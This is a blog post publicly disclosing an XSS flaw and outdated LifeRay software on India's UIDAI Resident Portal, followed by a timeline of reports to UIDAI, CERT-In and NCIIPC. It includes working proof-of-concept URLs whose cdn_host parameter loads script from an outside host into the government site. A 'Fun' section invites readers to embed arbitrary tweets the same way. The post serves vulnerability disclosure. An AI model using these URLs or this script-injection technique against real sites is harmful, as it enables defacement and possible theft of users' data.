---
title: Aadhaar Vulnerability Public Disclosure
layout: post
tags:
    - aadhaar
    - disclosure
    - sanitarypanels
    - 13ftwalls
---

# The Vulnerability

The UIDAI Resident Portal (with read access to entire Aadhaar Demographic data) is runing a vulnerable version
of LifeRay software. It is running LifeRay 6.1, which was declared End-of-Life in Febrary 2016.

This release includes multiple known vulnerabilities, including:

1.  A XSS issue, for which a PoC can be found at [resident.uidai.gov.in](https://resident.uidai.gov.in/?cdn_host=https://scan.bb8.fun)
2.  Multiple RCEs: See [issue-62](https://dev.liferay.com/web/community-security-team/known-vulnerabilities/liferay-portal-62) for eg.

In fact the release is so old it does not even appear on the ["Known Vulnerabilities"](https://dev.liferay.com/web/community-security-team/known-vulnerabilities) page on the LifeRay website; you have to go look at their [Archived Vulnerabilities](https://dev.liferay.com/web/community-security-team/known-vulnerabilities/liferay-portal-62).

# The PoC

You can find a simple Proof of Concept for the XSS issue at [resident.uidai.gov.in](https://resident.uidai.gov.in/?cdn_host=https://scan.bb8.fun).

The `cdn_host` parameter injects javascript from `$CDN_HOST/Resident-theme/js/custom.js`, in this case `https://scan.bb8.fun/Resident-theme/js/custom.js` which hosts a small snippet to overwrite the HTML of the page.

It shows up like:

![](/img/aadhaar1.jpg)

# Fun

If you'd like to embed your own tweet on UIDAI's website, you can share the following URL:

`https://resident.uidai.gov.in/?cdn_host=https://scan.bb8.fun&tweet=sanitarypanels/status/948987599191977986`

This embeds [this tweet](https://twitter.com/sanitarypanels/status/948987599191977986) and looks like this:

![](/img/aadhaar2.jpg)

# The Report

I initially reported this to `help@uidai.gov.in` in Jan 2017:

![](/img/aadhaar-report1.jpg)

Forgot all about it till Jan 2018, when someone mentioned I should try my luck with CERT-IN instead:

![](/img/aadhaar-report2.png)

This is still not fixed. Here is a complete timeline:

| Date        | What?                                                                                              |
| ----------- | -------------------------------------------------------------------------------------------------- |
| 16 Jan 2017 | Initially reported to `help@uidai.gov.in`. No response                                             |
| 21 Jan 2018 | Reported to `ceo@uidai.gov.in` and `nfo@cert-in.org.in`. No response                               |
| 19 Feb 2018 | Reminder sent to `ceo@uidai.gov.in` and `info@cert-in.org.in`                                      |
| 19 Feb 2018 | Acknowledgement from CERT                                                                          |
| 15 Mar 2018 | Reminder sent. No response                                                                         |
| 17 Mar 2018 | Notified [NCIIPC](rvdp@nciipc.gov.in)                                                              |
| 18 Mar 2018 | Confirmation from NCIIPC asking for more details. I replied back with a quote of previous exchange |
| 19 Mar 2018 | Confirmation from NCIIPC thanking me for the report.                                               |
| 19 Apr 2018 | Reminder sent to UIDAI asking for acknowledgement                                                  |
| 30 May 2018 | Reminder sent to NCIIPC and CERT asking for updates                                                |
